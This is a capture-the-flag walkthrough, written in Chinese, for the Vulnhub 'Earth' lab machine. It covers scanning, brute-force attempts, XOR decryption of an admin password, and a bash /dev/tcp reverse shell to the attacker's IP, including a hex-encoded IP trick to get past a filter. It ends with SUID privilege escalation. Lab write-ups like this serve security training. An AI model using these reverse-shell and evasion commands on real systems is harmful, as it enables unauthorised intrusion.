# Vulnerhub-Earth

## 一、靶机IP探测

```bash
arp-scan -l
```

![image-20220907134214332](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907134214332.png)

172.20.10.1是路由器IP，172.20.10.12是宿主机的IP，确定靶机IP为172.20.10.5.

## 二、端口扫描

```bash
nmap -T4 -sV -p- -A 172.20.10.5
```

![image-20220907140836595](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907140836595.png)

22端口是ssh端口，可以尝试爆破。

80和443两个端口是http端口，看到SAN（Subject Alternative Name）有两个域名。

## 三、端口分析

### 1、22端口ssh爆破

```bash
hydra -l root -p ssh_password.txt 172.20.10.5 ssh
```

![image-20220907141001206](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907141001206.png)

结果不出所料，失败。

### 2、http端口

通过浏览器访问80端口

![image-20220907141131150](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907141131150.png)

80端口400.

访问443

![image-20220907141211145](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907141211145.png)

443也一样。

根据经验，web业务一般都部署在80端口，所以对80端口进行分析。

服务器报400有两种可能。

> 1、错误的请求方式
>
> 2、不存在的域名

现在出现400可能是因为我们的dns没有解析域名。可以将扫描出来的两个域名进行绑定，然后尝试访问域名。

### 3、绑定域名

```bash
sudo vim /etc/hosts
```

![image-20220907142114089](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907142114089.png)

添加光标所在行的信息，然后保存退出。

## 四、访问网站

分别访问两个域名，发现长得一样。

![image-20220907142201978](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907142201978.png)

在Message框里随便输入字符后提交，下面就会出现一行数字，判断是将输入的字符进行了一些加密操作得到的数字。

### 1、目录扫描

这里要注意http和https要分别进行扫描

```bash
dirb http://earth.local
```

![image-20220907142833304](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907142833304.png)

（https扫描结果和http相同）

发现了一个admin，访问后提示要login。

![image-20220907142916619](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907142916619.png)

burpsuite爆破尝试一下。

![image-20220907143355130](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907143355130.png)

intruder选择cluster bomb模式，选中两个要爆破的点位。

![image-20220907143433371](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907143433371.png)

payload中设置爆破字典(kali的字典路径：/usr/share/wordlists)

爆破失败。

继续扫描另一个域名

```bash
dirb http://terratest.earth.local
```

得到与上一个域名相同的文件。

扫描https

```bash
dirb https://terratest.earth.local
```

![image-20220907144031039](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907144031039.png)

robots.txt值得注意，访问一下。

![image-20220907144108976](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907144108976.png)

最后这个应该是一个提示信息，访问一下，猜测后缀名是txt。

```
https://terratest.earth.local/testingnotes.txt
```

![image-20220907144424786](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907144424786.png)

翻译一下

> 测试安全消息系统注意事项：
>
> *使用XOR加密作为算法，应该与RSA中使用的一样安全。
>
> *地球已经确认他们收到了我们发送的信息。
>
> *testdata.txt用于测试加密。
>
> *terra用作管理门户的用户名。
>
> 待办事项：
>
> *我们如何将每月的密钥安全地发送到地球？还是我们应该每周换一次钥匙？
>
> *需要测试不同的密钥长度以防止暴力。钥匙应该多长时间？
>
> *需要改进消息传递界面和管理面板的界面，它目前非常基本。

三条有用信息

> 加密算法是XOR（异或）
>
> testdata.txt是加密文件
>
> terra是管理员的用户名

先获取加密文件testdata.txt

> According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.

**编写脚本解密**

```python
#密文是test.txt，就是首页的三行数字。密钥是testdata.txt
import binascii
testdata = binascii.b2a_hex(open('testdata.txt','rb').read()).decode()
for i in open('test.txt','r'):
    i = i.replace('\n','')
    print(hex(int(i,16) ^ int(testdata,16)))
```

得到结果

> 0x4163636f7264696e6720746f20726164696f6d657472696320646174696e6720657374696d6174696f6e20616e64206f746865722065766964656e63652c20456172746820666f726d6564206f76657220342e352062696c6c696f6e2079656172732061676f2e2057697468696e207468652066697273742062696c6c696f6e207965617273206f66204561727468277320686973436679202f2f7d6f6d6f3b2f70706561726527327e643b7f662427782c7f6a6a3d2a616c66332c6f717c79247736267c25516a76772b55203c40663b792f6a7f6b72307e683c506a31732e3d066997f3dc732d712c3c6a247b75676e247536267f2a2b6f2765726c6a7c6d6e6e2f3f3b2d277f31252c667b6b78382e607f6229228ce5996e70607573742a797a64317d7862693a6f7b297e73687d2c5e3623546a637937616a2c796e3e4868752d17736b6c2924496e2a27792f6479626a377074347e7522743d356a6768262379782a2b6677693d2f65617079726e63616e786b797f382f6b3c0b363d2b3180e8da712a497238786f22507c377766626e
> 0x4163636f7264696e6720746f20726164696f6d657472696320646174696e6720657374696d6174696f6e20616e64206f746865722065766964656e63652c20456172746820666f726d6564206f76657220342e352062696c6c696f6e2079656172732061676f2e2057697468696e207468652066697273742062696c6c696f6e207965617273206f66204561727468277320686973746f72792c206c69666520617070656172656420696e20746865206f6365616e7320616e6420626567616e20746f2061666665637420456172746827732061746d6f73706865726520616e6420737572666163652c206c656164696e6720746f207468652070726f6c5e72726c6a7e3c6576797f7b262a786b7c68246b61772d6f6320302d2777656231343669716324687465376166236065637e296f3e6b466e6b756b7a64747c613e797e63697976627e6a6e24364f3f30697e7f647c30767c246c78347e25356c33642a606d783661387b76636b65746469612025652c7b747239783e717b3177246826767e6f6178782d296966347476367075646b
> 0x6561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174656368616e67656261643468756d616e736561727468636c696d6174

将三个十六进制数分别转文本。

最后一个十六进制数转出来是earthclimatechangebad4humans 一直循环。

![image-20220907150409658](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907150409658.png)

此时得到后台管理员账号密码

```
账号：terra
密码：earthclimatechangebad4humans
```

登录后台

![image-20220907150605488](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907150605488.png)

看到一个窗口可以命令执行。

直接找flag文件

```bash
find / -name "*flag*"
```

![image-20220907150830884](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907150830884.png)

找到一个

```bash
cat /var/earth_web/user_flag.txt
```

得到flag![image-20220907151034532](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907151034532.png)

### 2、反弹shell

现在kali开启监听

```bash
nc -lvvp 1234
```

1234为监听的端口，也就是shell要反弹到的端口。

尝试反弹shell

```bash
bash -i >& /dev/tcp/172.20.10.2/1234 0>&1
```

![image-20220907151520661](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907151520661.png)

显示禁止远程连接。

猜测是对ip地址进行了检测。用16进制表示ip，命令改为

```bash
bash -i >& /dev/tcp/0xac.0x14.0x0a.0x02/1234 0>&1
```

反弹成功

![image-20220907152959215](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907152959215.png)

### 3、进行提权

查找具有SUID权限的文件

```bash
find / -perm -u=s -type f 2>/dev/null
```

![image-20220907153950713](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907153950713.png)

发现一个叫reset_root的文件。

查看属性并执行

```bash
ls -al /usr/bin/reset_root
```

![image-20220907155509188](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907155509188.png)

发现没有正确运行。需要调试改文件。

用strace命令

```
strace
```

![image-20220907155528581](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907155528581.png)

发现靶机上没有strace命令，需要拉回到攻击机上测试。

在攻击机上新开一个终端监听放射链接的输出。

```bash
nc -nvlp 1234>reset_boot
```

![image-20220907155842156](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907155842156.png)

靶机上执行，链接重定向命令

![image-20220907155825833](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907155825833.png)

攻击机的监听终端接收到文件。

![image-20220907160314912](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907160314912.png)

攻击机终端执行命令

```bash
ls -al
```

![image-20220907161105315](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907161105315.png)

用strace命令调试

```bash
strace ./reset_root
```

![image-20220907163118796](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907163118796.png)

发现权限不够。

需要chmod赋权。

```bash
sudo chmod +x reset_root
```

再strace一次

![image-20220907163256177](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907163256177.png)

发现缺了三个文件，在靶机上新建这三个对应文件就可以了。

```bash
mkdir /dev/shm/kHgTFI5G
mkdir /dev/shm/Zw7bV9U5
mkdir /tmp/kcM0Wewe
/usr/bin/reset_root
```

![image-20220907164438301](C:\Users\86135\AppData\Roaming\Typora\typora-user-images\image-20220907164438301.png)

得到密码 Earth